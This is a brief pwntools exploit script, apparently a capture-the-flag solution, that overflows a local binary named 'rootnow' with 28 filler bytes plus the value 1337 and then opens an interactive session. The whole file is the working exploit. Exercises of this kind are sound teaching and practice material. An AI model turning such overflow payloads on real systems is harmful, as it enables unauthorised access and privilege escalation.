from pwn import *

io = process(['./rootnow'])
payload = b'a'*28 + p32(1337)
io.sendline(payload)
io.interactive()
print(payload)
